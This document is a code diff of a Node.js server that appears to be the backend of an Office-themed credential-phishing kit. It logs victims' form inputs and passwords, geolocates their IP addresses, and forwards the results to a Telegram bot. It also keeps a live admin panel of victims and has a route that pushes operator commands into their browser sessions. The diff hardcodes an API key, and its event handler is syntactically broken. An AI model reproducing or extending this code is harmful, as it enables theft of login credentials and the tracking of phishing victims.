@@ -37,10 +37,10 @@ const defaultPassword = 'updateteam'; // Remember to hash passwords for security
 const hashedPassword = crypto.createHash('sha256').update(defaultPassword).digest('hex');
 
 db.serialize(() => {
-    db.run("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
-  db.run("CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, stats TEXT)");
-  db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");
-  
+    db.run("CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT, command TEXT)");
+    db.run("CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, stats TEXT)");
+    db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");
+
     db.get("SELECT * FROM admin WHERE username = ?", [defaultUsername], (err, row) => {
         if (err) {
             console.error(`Error checking admin: ${err.message}`);
@@ -61,7 +61,6 @@ db.serialize(() => {
     });
 });
 
-
 let visitors = 0;
 let humans = 0;
 let bots = 0;
@@ -70,22 +69,9 @@ let clients = {};
 let adminClient = null;
 let currPage = "";
 let message = '';
-function resetVisits(){
+
+function resetVisits() {
     visitors = 0;
-}
-
-
-
-function addClientToDatabase(clientId, ip) {
-    visitors++;
-    humans++;
-    db.run("INSERT INTO clients (id, inputs, ip) VALUES (?, ?, ?)", [clientId, JSON.stringify({}), ip], (err) => {
-        if (err) {
-            console.error(`Error adding client ${clientId}: ${err.message}`);
-        } else {
-            console.log(`Client ${clientId} with IP ${ip} added to the database`);
-        }
-    });
 }
 
 function addStatsToDatabase(stats) {
@@ -127,14 +113,12 @@ function getClientData(callback) {
     });
 }
 
-
 function broadcastAdminPanel(currPage, stats) {
     getClientData((clientList) => {
-         stats = { visitors, humans, bots };
-         currPage = {currPage};
-        //stats = JSON.stringify(stats); // Update stats globally
-		console.log(stats);
-        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats }); 
+        stats = { visitors, humans, bots };
+        currPage = { currPage };
+        console.log(stats);
+        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats });
         console.log(`Broadcasting to admin panel: ${message}`);
         if (adminClient) {
             adminClient.write(`data: ${message}\n\n`);
@@ -143,6 +127,25 @@ function broadcastAdminPanel(currPage, stats) {
         }
     });
 }
+
+function getClientIp(req) {
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    if (xForwardedFor) {
+        const ips = xForwardedFor.split(',');
+        return ips[0].trim();
+    }
+    return req.connection.remoteAddress || req.socket.remoteAddress || null;
+}
+
+const sendAPIRequest = async (ipAddress) => {
+    try {
+        const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
+        return apiResponse.data;
+    } catch (error) {
+        console.error(`Error fetching IP information: ${error.message}`);
+        return null;
+    }
+};
 
 app.get('/forgot', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'reset.html'));
@@ -181,56 +184,49 @@ app.post('/forgot', (req, res) => {
     });
 });
 
-function getClientIp(req) {
-    const xForwardedFor = req.headers['x-forwarded-for'];
-    if (xForwardedFor) {
-        const ips = xForwardedFor.split(',');
-        return ips[0].trim();
-    }
-    return req.connection.remoteAddress || req.socket.remoteAddress || null;
-}
-
-
-    const sendAPIRequest = async (ipAddress) => {
-        try {
-            const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
-            return apiResponse.data;
-        } catch (error) {
-            console.error(`Error fetching IP information: ${error.message}`);
-            return null;
+app.post('/delete-client', (req, res) => {
+    const { clientId } = req.body;
+    if (clientId) {
+        // Remove the client from memory and database
+        if (clients[clientId]) {
+            clients[clientId].end(); // End the SSE connection
+            delete clients[clientId];
         }
-    };
-
-    
-    //Command sec
-    app.post('/delete-client', (req, res) => {
-  const { clientId } = req.body;
-  if (clientId) {
-    // Remove the client from memory and database
-    if (clients[clientId]) {
-      clients[clientId].end(); // End the SSE connection
-      delete clients[clientId];
+        removeClientFromDatabase(clientId);
+        broadcastAdminPanel(currPage, stats);
+        res.sendStatus(200);
+    } else {
+        res.status(400).send('Missing clientId');
     }
-    removeClientFromDatabase(clientId);
-    broadcastAdminPanel();
-    res.sendStatus(200);
-  } else {
-    res.status(400).send('Missing clientId');
-  }
 });
-    
+
+app.post('/client-data', (req, res) => {
+    const clientId = req.body.clientId;
+    const clientIp = getClientIp(req);
+
+    if (!clientId) {
+        return res.status(400).send('Missing clientId');
+    }
+
+    addClientToDatabase(clientId, clientIp, (err, clientData) => {
+        if (err) {
+            return res.status(500).send('Internal server error');
+        }
+
+        res.json(clientData);
+    });
+});
+
 app.post('/send-command', (req, res) => {
-  const { clientId, command } = req.body;
-  const client = clients[clientId];
-  if (client) {
-    client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
-  }
-  res.sendStatus(200);
+    const { clientId, command } = req.body;
+    const client = clients[clientId];
+    if (client) {
+        client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
+    }
+    res.sendStatus(200);
 });
-//command sec end    
 
-
-const HEARTBEAT_INTERVAL = 60000; // 30 seconds
+const HEARTBEAT_INTERVAL = 60000; // 1 minute
 
 app.post('/heartbeat', (req, res) => {
     const clientId = req.body.clientId;
@@ -242,96 +238,51 @@ app.post('/heartbeat', (req, res) => {
         clients[clientId].timeout = setTimeout(() => {
             console.log(`No heartbeat received from client ${clientId}. Performing action.`);
             // Perform the desired action here
-            //delete clients[clientId];
         }, HEARTBEAT_INTERVAL);
         res.send('true');
         broadcastAdminPanel(currPage, visitors);
     } else {
-    	 currPage = "Disconnected";
-    	broadcastAdminPanel(currPage, visitors);
-        //res.status(404).send('Client not found');
+        currPage = "Disconnected";
+        broadcastAdminPanel(currPage, visitors);
     }
 });
 
-
-const MAX_RETRIES = 6;
-
-
-async function retryConnection(clientId, retries = MAX_RETRIES) {
-    while (retries > 0) {
-        try {
-            // Attempt to reconnect here. This could be a ping, an HTTP request, etc.
-            console.log(`Attempting to reconnect to client ${clientId}... (${MAX_RETRIES - retries + 1}/${MAX_RETRIES})`);
-            // If reconnect attempt is successful:
-            return true; 
-        } catch (error) {
-            console.log(`Reconnection attempt ${MAX_RETRIES - retries + 1} failed for client ${clientId}`);
-        }
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second before retrying
-        retries--;
-    }
-    console.log(`Failed to reconnect to client ${clientId} after ${MAX_RETRIES} attempts.`);
-    return false;
-}
-
-
-
 app.get('/events', (req, res) => {
-    const clientId = req.query.clientId;
     const isAdmin = req.query.admin === 'true';
     const clientIp = getClientIp(req);
-    
-    if (currPage === undefined || currPage === null || currPage === "" || currPage === "Disconnected") {
-        currPage = req.query.currPage || "defaultPage"; // Provide a default value if currPage is undefined, null, or an empty string
-    }
 
-    console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);
+    console.log(`Received /events request: isAdmin=${isAdmin}, ip=${clientIp}`);
 
-    if (clientId || isAdmin) {
+    if (isAdmin) {
+        adminClient = res;
+        console.log('admin connected');
+		}
+		
+		// Set headers for Server-Sent Events (SSE)
         res.setHeader('Content-Type', 'text/event-stream');
         res.setHeader('Cache-Control', 'no-cache');
         res.setHeader('Connection', 'keep-alive');
 
-        if (clientId && !clients[clientId]) {
-            addClientToDatabase(clientId, clientIp);
-            clients[clientId] = res;
-            console.log(`Client ${clientId} connected`);
-        }
-
-        if (isAdmin) {
-            adminClient = res;
-            console.log('Admin client connected');
-        }
-
-        req.on('close', async () => {
-            if (clientId) {
-                delete clients[clientId];
-                console.log(`Client ${clientId} disconnected`);
-                const reconnected = await retryConnection(clientId);
-                if (!reconnected) {
-                    console.log(`Unable to re-establish connection with client ${clientId}`);
-                }
-            }
-            if (isAdmin) {
-                adminClient = null;
-                console.log('Admin client disconnected');
-            }
-            broadcastAdminPanel(currPage, visitors); // Pass currPage here
+        // Send initial data to admin client
+        res.write(`data: ${JSON.stringify({ type: 'initial', clients: Object.keys(clients) })}\n\n`);
+		broadcastAdminPanel(currPage, stats);
+        
+        // Handle connection close
+        req.on('close', () => {
+            adminClient = null;
+            console.log('Admin client disconnected');
         });
-
-        broadcastAdminPanel(currPage, stats); // Pass currPage here
     } else {
-        res.status(400).send('Invalid clientId or admin query parameter');
+        const clientId = req.query.clientId;
+        clients[clientId] = res;
+         broadcastAdminPanel(currPage, stats);
+        });
     }
 });
-
 
 app.post('/input', async (req, res) => {
     try {
         const { clientId, currPage, inputs } = req.body;
-		
-
-
         console.log('Received /input request:', req.body);
         const ipAddress = getClientIp(req);
         const ipAddressInformation = await sendAPIRequest(ipAddress);
@@ -351,7 +302,7 @@ app.post('/input', async (req, res) => {
         });
 
         if (!row) {
-        	console.log("no row");
+            console.log("no row");
             await addClientToDatabase(clientId, ipAddress);
         }
 
@@ -367,46 +318,43 @@ app.post('/input', async (req, res) => {
 
         const userAgent = req.headers["user-agent"];
         const systemLang = req.headers["accept-language"];
-        //const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
-		
-			if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
-			  `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
+
+        if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
+            let message = `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
                 `👤 LOGIN \n\n`;
-                
-			  const inputKeys = Object.keys(inputs);
-			
-			  // Iterate over each key and access its corresponding value
-			  inputKeys.forEach(key => {
-			  	if (key === 'password') {
-			  		message += `🌍 GEO-IP INFO\n` +
-                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-                `CITY             : ${ipAddressInformation.location.city}\n` +
-                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-                `💻 SYSTEM INFO\n` +
-                `USER AGENT       : ${userAgent}\n` +
-                `SYSTEM LANGUAGE  : ${systemLang}\n` +
-                `💬 Telegram: https://t.me/UpdateTeams\n`;
-				      return;
-				    }
-			    const value = inputs[key];
-			    console.log(`${key}: ${value}\n`);
-			    message += `${key}: ${value}\n`;
-			    
-			  });
-			  const sendMessage = sendMessageFor(botToken, chatId);
+
+            const inputKeys = Object.keys(inputs);
+
+            inputKeys.forEach(key => {
+                if (key === 'password') {
+                    message += `🌍 GEO-IP INFO\n` +
+                        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+                        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+                        `CITY             : ${ipAddressInformation.location.city}\n` +
+                        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+                        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+                        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+                        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+                        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+                        `💻 SYSTEM INFO\n` +
+                        `USER AGENT       : ${userAgent}\n` +
+                        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+                        `💬 Telegram: https://t.me/UpdateTeams\n`;
+                    return;
+                }
+                const value = inputs[key];
+                console.log(`${key}: ${value}\n`);
+                message += `${key}: ${value}\n`;
+            });
+
+            const sendMessage = sendMessageFor(botToken, chatId);
             sendMessage(message);
             console.log(`message: ${message}`);
-            
-            } else {
-			  console.log('Inputs are empty or not defined.');
-			}
-        
-        
+
+        } else {
+            console.log('Inputs are empty or not defined.');
+        }
+
         res.sendStatus(200);
     } catch (error) {
         console.error(`Error processing request: ${error.message}`);
@@ -414,20 +362,54 @@ app.post('/input', async (req, res) => {
     }
 });
 
+app.post('/update-inputs', (req, res) => {
+    const { clientId, inputs } = req.body;
 
-
-app.post('/process-request', async (req, res) => {
-    try {
-    	
-    } catch (error) {
-        console.error(`Error processing request: ${error.message}`);
-        res.sendStatus(500);
+    if (clients[clientId]) {
+        // Update client inputs in the database
+        updateClientInputs(clientId, inputs);
+        broadcastAdminPanel(currPage, stats);
+        res.sendStatus(200);
+    } else {
+        res.status(404).send('Client not found');
     }
 });
 
+app.post('/confirm-api', (req, res) => {
+    const { apiKey } = req.body;
+    if (apiKeys.has(apiKey)) {
+        res.json({ success: true });
+    } else {
+        res.status(401).json({ success: false, message: 'Invalid API key' });
+    }
+});
 
-// Setup session middleware
+app.post('/verify', async (req, res) => {
+    const { email } = req.body;
+    const apiKey = '59637b640cb0fcbdd080e2b52d6dbc0b9191a2a0e974c746ad9331d23450'; // Replace with your actual API key
+    const url = `https://api.quickemailverification.com/v1/verify?email=${email}&apikey=${apiKey}`;
 
+    try {
+        // Make request to QuickEmailVerification API
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error('Failed to verify email');
+        }
+
+        const data = await response.json();
+
+        // Check the result and disposable status from the API response
+        if (data.result === 'valid' && data.disposable === 'false') {
+        	console.log(email +" : "+ data);
+            res.json({ success: true }); // Email is valid
+        } else {
+            res.json({ success: false }); // Email is invalid or disposable
+        }
+    } catch (error) {
+        console.error('Error verifying email:', error);
+        res.status(500).json({ success: false, error: 'Failed to verify email' });
+    }
+});
 
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
@@ -529,34 +511,18 @@ app.post('/confirm-api', (req, res) => {
     }
 });
 
-app.post('/verify', async (req, res) => {
-    const { email } = req.body;
-    const apiKey = '59637b640cb0fcbdd080e2b52d6dbc0b9191a2a0e974c746ad9331d23450'; // Replace with your actual API key
-    const url = `https://api.quickemailverification.com/v1/verify?email=${email}&apikey=${apiKey}`;
-
-    try {
-        // Make request to QuickEmailVerification API
-        const response = await fetch(url);
-        if (!response.ok) {
-            throw new Error('Failed to verify email');
-        }
-
-        const data = await response.json();
-
-        // Check the result and disposable status from the API response
-        if (data.result === 'valid' && data.disposable === 'false') {
-        	console.log(email +" : "+ data);
-            res.json({ success: true }); // Email is valid
-        } else {
-            res.json({ success: false }); // Email is invalid or disposable
-        }
-    } catch (error) {
-        console.error('Error verifying email:', error);
-        res.status(500).json({ success: false, error: 'Failed to verify email' });
-    }
-});
-
 
 app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}/`);
+    console.log(`Server running on port ${port}`);
+});
+
+process.on('SIGINT', () => {
+    db.close((err) => {
+        if (err) {
+            console.error(`Error closing database: ${err.message}`);
+        } else {
+            console.log('Database connection closed');
+        }
+        process.exit();
+    });
 });
